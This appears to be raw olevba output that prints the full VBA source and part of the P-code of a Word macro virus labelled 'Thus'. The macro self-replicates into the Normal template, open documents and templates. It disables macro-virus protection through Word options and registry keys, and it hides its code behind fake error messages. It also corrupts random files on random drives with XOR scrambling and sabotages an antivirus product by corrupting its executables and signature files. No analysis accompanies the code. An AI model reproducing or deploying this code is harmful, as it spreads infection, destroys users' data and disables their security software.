olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Thus_001'
'NIST_32a'
Private Declare Function CopyFile& Lib "kernel32" Alias "CopyFileA" (ByVal _
    lpExistingFileName As String, ByVal lpNewFileName As String, ByVal _
    bFailIfExists As Long)

Private Sub Document_Open()
Dim Res As String, x As String, k As Integer, Sd As Boolean, Nt As Boolean
    On Error Resume Next
2
    If Application.ShowVisualBasicEditor Then GoTo 2
With Application
    .EnableCancelKey = 0
    .ScreenUpdating = False
    .Options.VirusProtection = Chr(3696 / 7 / 11)
    .Options.ConfirmConversions = Chr(8976 / 11 / 17)
    .Options.SaveNormalPrompt = Chr(1872 / 3 / 13)
    .Options.SavePropertiesPrompt = Chr(9072 / 9 / 21)
    .DefaultSaveFormat = ""
    .DisplayAlerts = 0
    .DisplayStatusBar = Chr(48)
End With
         WordBasic.DisableAutoMacros 0
    If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 9) <> "'NIST_32a" Then
     NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    Nt = -1
    End If
         Randomize
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Left(Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 9) <> "'NIST_32a" Then
    Sd = Application.Documents.Item(k).Saved
    Application.Documents.Item(k).ReadOnlyRecommended = Chr(48)
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    If (Sd) And (Dir(Application.Documents.Item(k).FullName, 7) <> "") Then Application.Documents.Item(k).Save
    End If
    Next k
    For k = 1 To Application.Templates.Count
    If Left(Application.Templates.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1), 9) <> "'NIST_32a" Then
    Application.Templates.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Templates.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Templates.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Templates.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    Next k
    If Nt Then Exit Sub
Dpio
If ActiveDocument.SaveFormat < 2 Then
    If (ActiveDocument.Saved = False) And (ActiveDocument.ReadOnly = False) Then
       If Dir(ActiveDocument.FullName, 7) = "" Then
       ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, ReadOnlyRecommended:=0
       Else: ActiveDocument.Save
       End If
       ActiveDocument.Saved = False
    End If
Rcy ActiveDocument.FullName
End If
Asd
Res = Rdr(Chr(Int((Gds() * Rnd) + 1) + 66) & Chr(58) & Chr(92))
If Res <> "" Then x = Rfe(Res, "*.*")
If x <> "" Then Res = Res & x Else Res = ""
If Res <> "" Then Dfe Res
    Application.ScreenUpdating = True
    Application.EnableCancelKey = 1
    Application.DisplayAlerts = -1
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub
Private Sub AutoExec()
    Document_Open
End Sub
Private Sub AutoExit()
    Document_Open
End Sub
Private Sub FileOpen()
On Error GoTo Fo
With Dialogs(80)
    .Display
If .Name <> "" Then
     SetAttr .Name, 0
    .ReadOnly = Chr(48)
    .ConfirmConversions = 0
    .Execute
End If
End With
Fo:
End Sub
Private Sub AutoSave()
    Document_Open
End Sub
Private Sub Auto_Save()
    Document_Open
End Sub
Private Sub ToolsMacro()
Document_Open
MsgBox "File VBADLG.DLL not found", 16
End Sub
Private Sub ViewVBCode()
Document_Open
MsgBox "File VBADLG.DLL not found", 16
End Sub
Private Sub FileTemplates()
Document_Open
MsgBox "Global template not loaded", 16
End Sub
Private Sub ToolsOptions()
    Application.Options.VirusProtection = Chr(49)
    Dialogs(wdDialogToolsOptions).Show
    Application.Options.VirusProtection = Chr(48)
End Sub
Private Function Gds() As Byte
Const Rt = ":\"
Dim FileNum As Integer
Dim St As String
Dim i As Byte, k As Byte
On Error GoTo Ext
    For i = 1 To 27
    St = Chr(66 + i) & Rt & Chr(96)
    FileNum = FreeFile
     Open St For Binary As #FileNum
     Close #FileNum
     Kill St
     k = k + 1
    Next i
Ext:
    Gds = k
End Function
Private Function Rdd(ByVal Path As String) As String
Const Maska = "*.*"
Dim n As Integer, i As Integer
Dim Buf(1 To 4000) As String
Dim FindNmi As String
       n = 0
       i = 1
If Right(Path, 1) <> "\" Then Path = Path & "\"
On Error GoTo Errs
  FindNmi = Dir(Path, 23)
  Do While FindNmi <> ""
    If (GetAttr(Path & FindNmi) And vbDirectory) = vbDirectory Then
        If Mid(FindNmi, 1, 1) <> "." Then
                  n = n + 1
             Buf(i) = FindNmi
                    i = i + 1
        End If
    End If
         FindNmi = Dir
  Loop
        Rdd = UCase(Path & Buf(Int((n * Rnd) + 1)))
Errs:
        If n = 0 Then Rdd = ""
End Function
Private Function Rdr(ByVal Path As String) As String
Const Root = ":"
Dim tmp As String
Dim i As Integer
Dim GetRandom As Integer
Dim RandStep As Integer
   GetRandom = Int((1001 * Rnd) + 1)
     RandStep = 0

   For i = 1 To 10
        tmp = Rdd(Path)
        If tmp <> "" Then Path = tmp
        If (tmp = "") And (i = 1) Then
              Rdr = ""
              Exit Function
        End If
        If (tmp = "") And (i <> 1) Then
              Rdr = Path & "\"
              Exit Function
        End If
    Select Case RandStep
        Case 0 To 200
            RandStep = RandStep + 200
        Case 400 To 600
            RandStep = RandStep + 100
        Case 700 To 900
            RandStep = RandStep + 50
    End Select
        If RandStep >= GetRandom Then
             Rdr = Path & "\"
             Exit Function
        End If
     Next i
End Function
Private Function Rfe(ByVal Path As String, Maska As String) As String
Dim n As Integer, i As Integer
Dim Buf(1 To 4000) As String
Dim FindNmi As String
           n = 0
           i = 1
Path = Path & Maska
  On Error GoTo Errs
  FindNmi = Dir(Path, 7)
  Do While FindNmi <> ""
          n = n + 1
        Buf(i) = FindNmi
            i = i + 1
         FindNmi = Dir
  Loop
        Rfe = UCase(Buf(Int(n * Rnd) + 1))
Errs:
        If n = 0 Then Rfe = ""
End Function
Private Sub Dfe(Path As String)
Dim Attr As Integer
Dim Siz As Long, Cmp As Long
Dim FileNum As Integer
Dim i As Integer
Dim Ofs As Byte
On Error GoTo Ends
    Siz = FileLen(Path)
If Siz < 11 Then Exit Sub
    Attr = GetAttr(Path)
    SetAttr Path, 0
    FileNum = FreeFile
Open Path For Binary As #FileNum
    If Siz < 32763 Then Ofs = 9 Else Ofs = 3
    Get #FileNum, Siz - Ofs, Cmp
If Siz = Cmp Then Exit Sub
    Cmp = Siz
If Siz > 32763 Then Siz = 32763
ReDim Buf(1 To Siz) As Byte
        Rnd (-100)
    Get #FileNum, 10, Buf
    For i = 1 To Siz
    Buf(i) = Buf(i) Xor Int((255 * Rnd) + 0)
    Next i
    Put #FileNum, 10, Buf
        Cmp = Cmp + Ofs
    Put #FileNum, Cmp - Ofs, Cmp
    Close #FileNum
    SetAttr Path, Attr
Ends:
End Sub
Private Sub Rcy(Sours As String)
Dim Fls As String, DirR As String
Dim k As Long, Er As Integer
On Error GoTo YYY
Do
DirR = Rdr(Chr(Int((Gds() * Rnd) + 1) + 66) & Chr(58) & Chr(92))
Fls = Rfe(DirR, "*.*")
Er = Er + 1
If Er > 10 Then Exit Sub
Loop Until Fls <> ""
k = InStr(1, Fls, ".", 1)
If k <> 0 Then
Fls = Left(Fls, Len(Fls) - (Len(Fls) - k) - 1)
End If
Fls = Fls & ".DOC"
DirR = DirR & Fls
k = CopyFile&(Sours, DirR, 0)
YYY:
End Sub
Private Sub Dpio()
Const Path = "\Software\Microsoft\Office\"
Const Ver = "8.0\"
Const NewUse = "New User Settings\"
Const Def = "\.Default"
Dim Keys(1 To 3) As String
Keys(1) = "HKEY_LOCAL_MACHINE"
Keys(2) = "HKEY_CURRENT_USER"
Keys(3) = "HKEY_USERS"
Dim Dis(1 To 3) As String
Dis(1) = "EnableMacroVirusProtection"
Dis(2) = "Options6"
Dis(3) = "MacroVirusProtection"
Dim AddId(1 To 6) As String
AddId(1) = "Word\Options"
AddId(2) = "Excel\Microsoft Excel"
AddId(3) = "PowerPoint\Options"
AddId(4) = "Word\7.0\Options"
AddId(5) = "Excel\7.0\Microsoft Excel"
AddId(6) = "PowerPoint\7.0\Options"
Dim i As Integer
Dim k As Integer
Dim x As Integer
Dim Use As String
On Error Resume Next
With System
Use = .PrivateProfileString("", Keys(1) & "\System\CurrentControlSet\control", "Current User")
If Use <> ".Default" Then x = 3 Else x = 2
For k = 1 To x
For i = 1 To 3
Select Case k
Case 1
.PrivateProfileString("", Keys(k) & Path & Ver & NewUse & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & "\Software\Microsoft\" & NewUse & AddId(i + 3), Dis(i)) = Chr(48)
Case 2
.PrivateProfileString("", Keys(k) & Path & Ver & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & "\Software\Microsoft\" & AddId(i + 3), Dis(i)) = Chr(48)
Case 3
.PrivateProfileString("", Keys(k) & Def & Path & Ver & AddId(i), Dis(i)) = Chr(48)
.PrivateProfileString("", Keys(k) & Def & "\Software\Microsoft\" & AddId(i + 3), Dis(i)) = Chr(48)
End Select
Next i
Next k
End With
End Sub
Private Sub Asd()
Const Path1 = "\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Const Path2 = "\System\CurrentControlSet\Services\VxD\SpIDer"
Const Key = "HKEY_LOCAL_MACHINE"
Const RN = "RUNDLL.EXE"
Dim Nmi As String
Dim ProgPath As String
On Error Resume Next
Nmi = Chr(83) & Chr(112) & Chr(73) & Chr(68) & Chr(101) & Chr(114)
With System
ProgPath = .PrivateProfileString("", Key & Path1, Nmi)
If (ProgPath <> "") And (ProgPath <> RN) Then
.PrivateProfileString("", Key & Path1, Nmi) = RN
.PrivateProfileString("", Key & Path2, "StaticVxD") = "*IOS"
ProgPath = Ptd(ProgPath)
Nmi = Dir(ProgPath & "*.EXE", 7)
Do While Nmi <> ""
Dfe (ProgPath & Nmi)
Nmi = Dir
Loop
Nmi = Dir(ProgPath & "*.VDB", 7)
Do While Nmi <> ""
Dfe (ProgPath & Nmi)
Nmi = Dir
Loop
End If
End With
End Sub
Private Function Ptd(Path As String) As String
Dim tmp As String
Dim i As Long, k As Long
On Error GoTo Sti
If Path = "" Then GoTo Sti
k = Len(Path)
For i = k To 1 Step -1
    If Mid(Path, i, 1) = "\" Then Exit For
Next i
Ptd = Left(Path, i)
Exit Function
Sti:
    Ptd = ""
End Function





















-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Thus-based
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 20924 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0009 "Thus_001'"
' Line #2:
' 	QuoteRem 0x0000 0x0009 "NIST_32a'"
' Line #3:
' 	LineCont 0x0008 0A 00 04 00 14 00 04 00
' 	FuncDefn (Private Declare Function CopyFile Lib "kernel32" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long))
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub Document_Open())
' Line #6:
' 	Dim 
' 	VarDefn Res (As String)
' 	VarDefn x (As String)
' 	VarDefn k (As Integer)
' 	VarDefn Sd (As Boolean)
' 	VarDefn Nt (As Boolean)
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LineNum 2 
' Line #9:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #10:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #11:
' 	LitDI2 0x0000 
' 	MemStWith EnableCancelKey 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #13:
' 	LitDI2 0x0E70 
' 	LitDI2 0x0007 
' 	Div 
' 	LitDI2 0x000B 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt VirusProtection 
' Line #14:
' 	LitDI2 0x2310 
' 	LitDI2 0x000B 
' 	Div 
' 	LitDI2 0x0011 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt ConfirmConversions 
' Line #15:
' 	LitDI2 0x0750 
' 	LitDI2 0x0003 
' 	Div 
' 	LitDI2 0x000D 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt SaveNormalPrompt 
' Line #16:
' 	LitDI2 0x2370 
' 	LitDI2 0x0009 
' 	Div 
' 	LitDI2 0x0015 
' 	Div 
' 	ArgsLd Chr 0x0001 
' 	MemLdWith Options 
' 	MemSt SavePropertiesPrompt 
' Line #17:
' 	LitStr 0x0000 ""
' 	MemStWith DefaultSaveFormat 
' Line #18:
' 	LitDI2 0x0000 
' 	MemStWith DisplayAlerts 
' Line #19:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	MemStWith DisplayStatusBar 
' Line #20:
' 	EndWith 
' Line #21:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #22:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "'NIST_32a"
' 	Ne 
' 	IfBlock 
' Line #23:
' 	LineCont 0x0008 0C 00 04 00 1A 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #24:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Nt 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	ArgsCall Read 0x0000 
' Line #27:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LineCont 0x000C 0C 00 04 00 1A 00 04 00 26 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #31:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #32:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "'NIST_32a"
' 	Ne 
' 	IfBlock 
' Line #33:
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	St Sd 
' Line #34:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt ReadOnlyRecommended 
' Line #35:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LineCont 0x000C 11 00 04 00 1C 00 04 00 2B 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #39:
' 	Ld Sd 
' 	Paren 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld k 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Templates 
' 	MemLd Count 
' 	For 
' Line #43:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "'NIST_32a"
' 	Ne 
' 	IfBlock 
' Line #44:
' 	LineCont 0x0008 11 00 04 00 1F 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #47:
' 	LineCont 0x000C 11 00 04 00 1C 00 04 00 2B 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld k 
' 	Ld Application 
' 	MemLd Templates 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	Ld Nt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #51:
' 	ArgsCall Dpio 0x0000 
' Line #52:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	LitDI2 0x0002 
' 	Lt 
' 	IfBlock 
' Line #53:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #54:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #55:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	LitDI2 0x0000 
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #56:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsCall Rcy 0x0001 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	ArgsCall Asd 0x0000 
' Line #63:
' 	ArgsLd Gds 0x0000 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0042 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsLd Rdr 0x0001 
' 	St Res 
' Line #64:
' 	Ld Res 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Res 
' 	LitStr 0x0003 "*.*"
' 	ArgsLd Rfe 0x0002 
' 	St x 
' 	EndIf 
' Line #65:
' 	Ld x 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Res 
' 	Ld x 
' 	Concat 
' 	St Res 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	St Res 
' 	EndIf 
' Line #66:
' 	Ld Res 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Res 
' 	ArgsCall Dfe 0x0001 
' 	EndIf 
' Line #67:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #68:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #69:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #70:
' 	EndSub 
' Line #71:
' 	FuncDefn (Private Sub Document_Close())
' Line #72:
' 	ArgsCall Document_Open 0x0000 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Private Sub Document_New())
' Line #75:
' 	ArgsCall Document_Open 0x0000 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Private Sub AutoExec())
' Line #78:
' 	ArgsCall Document_Open 0x0000 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Private Sub AutoExit())
' Line #81:
' 	ArgsCall Document_Open 0x0000 
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Private Sub FileOpen())
' Line #84:
' 	OnError Fo 
' Line #85:
' 	StartWithExpr 
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #86:
' 	ArgsMemCallWith Display 0x0000 
' Line #87:
' 	MemLdWith New 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #88:
' 	MemLdWith New 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #89:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	MemStWith ReadOnly 
' Line #90:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #91:
' 	ArgsMemCallWith Execute 0x0000 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	EndWith 
' Line #94:
' 	Label Fo 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Private Sub AutoSave())
' Line #97:
' 	ArgsCall Document_Open 0x0000 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Private Sub Auto_Save())
' Line #100:
' 	ArgsCall Document_Open 0x0000 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Private Sub ToolsMacro())
' Line #103:
' 	ArgsCall Document_Open 0x0000 
' Line #104:
' 	LitStr 0x0019 "File VBADLG.DLL not found"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Private Sub ViewVBCode())
' Line #107:
' 	ArgsCall Document_Open 0x0000 
' Line #108:
' 	LitStr 0x0019 "File VBADLG.DLL not found"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Private Sub FileTemplates())
' Line #111:
' 	ArgsCall Document_Open 0x0000 
' Line #112:
' 	LitStr 0x001A "Global template not loaded"
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' Line #113:
' 	EndSub 
' Line #114:
' 	FuncDefn (Private Sub ToolsOptions())
' Line #115:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #116:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
